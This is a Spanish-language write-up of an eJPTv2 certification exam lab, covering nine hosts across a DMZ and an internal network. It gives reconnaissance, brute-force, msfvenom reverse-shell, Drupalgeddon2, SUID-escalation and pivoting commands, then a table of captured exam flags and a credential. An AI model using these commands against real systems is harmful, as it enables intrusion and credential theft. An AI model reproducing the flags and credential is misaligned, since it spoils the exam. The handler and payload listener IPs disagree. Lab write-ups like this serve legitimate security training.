# eJPTv2 — Lecciones Aprendidas, Recomendaciones y Comandos

Síntesis del examen a partir de los 9 hosts documentados. La red se divide en dos segmentos: una **DMZ** (`192.168.100.0/24`) accesible directamente desde Kali, y una **red interna** (`192.168.0.0/24`) a la que solo se llega **pivotando** a través del host dual-homed WINSERVER-03.

---

## 1. Topología y resumen de hosts

| Host | IP | Segmento | SO / Nombre | Vector principal | Resultado |
|------|------|----------|-------------|------------------|-----------|
| 1 | 192.168.100.50 | DMZ | Win Server 2012 R2 / WINSERVER-01 | WordPress 5.9.3 → fuerza bruta WPScan + CME SMB | RDP como `mike` + flag |
| 2 | 192.168.100.51 | DMZ | Win Server 2012 R2 / WINSERVER-02 | FTP anónimo + IIS/WebDAV → payload `.aspx` | Meterpreter + flag |
| 3 | 192.168.100.52 | DMZ | Ubuntu / Drupal | Drupal 7.57 → Drupalgeddon2 → SUID `find` | root + 2 flags |
| 4 | 192.168.100.55 | DMZ + interna | Win Server 2019 / WINSERVER-03 | Password spraying (CrackMapExec) | Admin local + flag · **pivote** |
| 5 | 192.168.100.63 | DMZ | Windows / EC2AMAZ-IK4QFED | Solo RDP + WinRM | Sin foothold |
| 6 | 192.168.100.67 | DMZ | Ubuntu | Solo SSH | Sin foothold |
| 7 | 192.168.0.51 | Interna | Ubuntu | Webmin 1.920 (puerto 10000) → RCE | flag |
| 8 | 192.168.0.57 | Interna | Ubuntu | Solo SSH | Sin foothold |
| 9 | 192.168.0.61 | Interna | Windows / EC2AMAZ-IK4QFED | Solo RDP + WinRM | Sin foothold |

---

## 2. Lo aprendido

### Enumeración
- **Un escaneo completo manda la partida.** Casi todos los vectores salieron del `nmap -sV -sC -p-`: versiones exactas (Drupal, Wing/IIS/WAMP, Webmin, MariaDB), banners que delataban el hostname y servicios no estándar.
- **Virtual hosting en Windows:** cuando la página no cargaba por IP, agregar el dominio a `/etc/hosts` (ej. `wordpress.local`) destrababa la aplicación real.
- **Identificar versión = elegir exploit.** `changelog.txt` dio la versión de Drupal; el banner de MiniServ, la de Webmin; el footer/emoji settings, la de WordPress.

### Servicios y credenciales
- **FTP anónimo es oro** y apareció dos veces: en el Host 2 compartía webroot con IIS (subir + ejecutar = RCE), y en el Host 3 un `updates.txt` reveló la lógica de credenciales ("usuarios de Drupal = contraseñas del sistema").
- **SMB sin autenticar** permite enumerar usuarios con CrackMapExec (`--rid-brute`), y luego cada usuario es un objetivo de fuerza bruta/spraying.
- **Reutilización de credenciales:** una contraseña encontrada en un sitio web/BD (`settings.php`) suele valer también como credencial de sistema (SSH/RDP).

### Explotación
- En **IIS** el payload va en `.aspx` (no `.php`); en servidores PHP, al revés.
- **Metasploit** resolvió los servicios con CVE conocido (Drupalgeddon2) y sirvió de handler para los payloads de msfvenom.
- Ante un RCE, el patrón es siempre: confirmar ejecución → establecer canal interactivo (`shell` / reverse shell).

### Post-explotación y escalada
- **Linux:** primer reflejo → `find / -perm -4000` (SUID). `find` con SUID = root directo vía `-exec /bin/sh -p`.
- **Linux:** leer archivos de configuración (`settings.php`, `users.txt`) expone credenciales almacenadas localmente.
- **Windows:** `net user` para enumerar cuentas; identificar **cuál** cuenta es Administrador local es tan importante como tener una credencial válida (en WINSERVER-03, `mary` no podía leer la flag; `admin` sí).

### Pivoting (lo más valioso del examen)
- El host **dual-homed** (WINSERVER-03, con DNS apuntando a `192.168.0.2`) es la puerta a la red interna.
- Tras comprometerlo, se agrega la ruta con **`autoroute` / `route`** en Meterpreter y recién ahí se puede escanear/atacar `192.168.0.0/24`.
- El indicio temprano de la red interna salió de un simple `ipconfig /all` en el Host 2 (servidor DNS `192.168.0.2`).

---

## 3. Recomendaciones / metodología

1. **Mapear primero toda la red:** `nmap -sn` al segmento para listar hosts vivos antes de profundizar.
2. **Escaneo completo por host** (`-p- -sV -sC -O`) y guardar salida (`-oN`). No confiar solo en los puertos por defecto.
3. **Un cuaderno por host** con: info recolectada (SO, hostname, servicios), credenciales y flags. Mantener el formato consistente ahorra tiempo en el reporte.
4. **Siempre probar lo barato primero:** login anónimo (FTP/SMB), credenciales por defecto (`admin:admin`), `searchsploit <servicio> <versión>`.
5. **Guardar TODA credencial** apenas aparece y probarla en otros servicios/hosts (reutilización lateral).
6. **Descomprimir `rockyou.txt` al inicio** (`gunzip`) para no frenarse en medio de un ataque.
7. **Confirmar la versión exacta** antes de lanzar un exploit (evita perder tiempo con PoCs que no aplican, como pasó con WampServer/xdebug en el Host 1).
8. **En Windows, tras conseguir shell:** revisar `ipconfig /all` y `route print` — las interfaces y el DNS revelan segmentos internos para pivotar.
9. **No forzar hosts sin superficie:** los que solo exponen RDP/WinRM/SSH se atacan por reutilización de credenciales, no por exploit; priorizar los que sí tienen aplicación.
10. **Pivotar con disciplina:** comprometer el dual-homed → `autoroute` → escanear la interna sobre un set de puertos comunes.

---

## 4. Comandos utilizados

### 4.1 Descubrimiento de red
```sh
# Interfaz y ruta del atacante
ip a
route -n

# Hosts vivos en el segmento (ping sweep)
sudo nmap -sn 192.168.100.0/24 -oN hosts.txt
```

### 4.2 Escaneo por host
```sh
# Escaneo completo con detección de versión, scripts y SO (DMZ)
nmap -Pn -sS -sV -sC -T4 -p- -O -oN 192.168.100.50.txt 192.168.100.50

# Escaneo sobre puertos comunes a través del pivote (red interna)
nmap -sS -sV -p 21,22,80,135,139,445,3306,3389,5432,5985,8080,10000 192.168.0.51
```

### 4.3 Enumeración web
```sh
# Fuzzing de directorios
dirb http://192.168.100.50/

# Virtual hosting: agregar dominio a /etc/hosts
nano /etc/hosts        # 192.168.100.50 wordpress.local

# Buscar exploits por servicio/versión
searchsploit wampserver
searchsploit xdebug
searchsploit wordpress responsive thumbnail

# WordPress: enumerar plugins y usuarios
wpscan --url http://192.168.100.50/ -e ap,u --wp-content-dir wordpress/

# WordPress: fuerza bruta de credenciales
wpscan --url http://192.168.100.50/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
```

### 4.4 Wordlists
```sh
# Descomprimir rockyou antes de los ataques de fuerza bruta
gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 4.5 FTP (acceso anónimo)
```sh
ftp 192.168.100.52
ls
get updates.txt
exit
cat updates.txt

# Subida de archivo (Host 2) — modo binario obligatorio para el payload
ftp 192.168.100.51
binary
put shell86.aspx
```

### 4.6 SMB / credenciales (CrackMapExec)
```sh
# Enumerar usuarios por RID sin credenciales
crackmapexec smb 192.168.100.50 -u 'guest' -p '' --rid-brute

# Fuerza bruta / password spraying contra una cuenta
crackmapexec smb 192.168.100.50 -u mike -p /usr/share/wordlists/rockyou.txt
crackmapexec smb 192.168.100.55 -u mary -p /usr/share/wordlists/rockyou.txt
```

### 4.7 Explotación con Metasploit
```sh
# Handler para recibir el payload de msfvenom (Host 2)
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.51
set LPORT 4444
run

# Drupalgeddon2 — RCE sobre Drupal 7.57 (Host 3)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.52
set TARGETURI /drupal/
run
```

### 4.8 Generación de payloads (msfvenom)
```sh
# Payload ASPX para IIS (Host 2)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f aspx > shell86.aspx

# Disparar el payload subido (queda accesible como web en el webroot)
curl http://192.168.100.51/shell86.aspx
```
> Reverse shell web también vía `revshells.com` (PHP PentestMonkey), subiendo `shell.php.jpg` y renombrándola a `shell.php` interceptando con BurpSuite.

### 4.9 Acceso remoto (RDP)
```sh
xfreerdp /v:192.168.100.50 /u:mike /p:'diamond' /dynamic-resolution
```

### 4.10 Post-explotación — Linux
```sh
# Enumerar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Escalada abusando de SUID en find (GTFOBins)
find . -exec /bin/sh -p \; -quit

# Credenciales almacenadas localmente
cat settings.php        # credenciales de la BD de Drupal
ip a                    # interfaces del host
```

### 4.11 Post-explotación — Windows
```cmd
net user                 :: enumerar cuentas locales
ipconfig /all            :: interfaces, DNS (pista de red interna)
route print              :: tabla de rutas
certutil                 :: descarga de archivos desde un servidor remoto
```
```pwsh
(Get-HotFix).Count       # número de parches instalados (Host 1)
```

### 4.12 Pivoting (Meterpreter)
```sh
# Agregar ruta a la red interna a través del host dual-homed (WINSERVER-03)
run autoroute -s 192.168.0.0/24
# o, de forma equivalente:
route add 192.168.0.0 255.255.255.0 <session_id>
```

---

## 5. Flags obtenidas

| Host | Ubicación | Flag |
|------|-----------|------|
| 1 — WINSERVER-01 | `C:\Users\mike\Documents\flag.txt` | `e22174e4d9c546a4891e9ed819070ad5` |
| 2 — WINSERVER-02 | `C:\Users\Administrator\Desktop` | `c0a1497bad4c4f029ab3f703aa9c9c89` |
| 3 — Drupal (user) | home de `auditor` | `40a1dd4ede664ccfb53973e9d9214db8` |
| 3 — Drupal (root) | `/root` | `fa5c44fbadf54dee8da5580b9c51effe` |
| 4 — WINSERVER-03 | `C:\Users\Administrator\flag.txt` | `e8b75cc5489346afaa839321b4414027` |
| 7 — interno (Webmin) | — | `7a8cb18f24dd41a58b4a6cce55c2e9f2` |

> Nota: en el Host 4 se registró también el código `e8b75cc...` como flag del Administrator; la flag de WINSERVER-02 con valor `c0a1497...` estaba en el Desktop del Administrator.
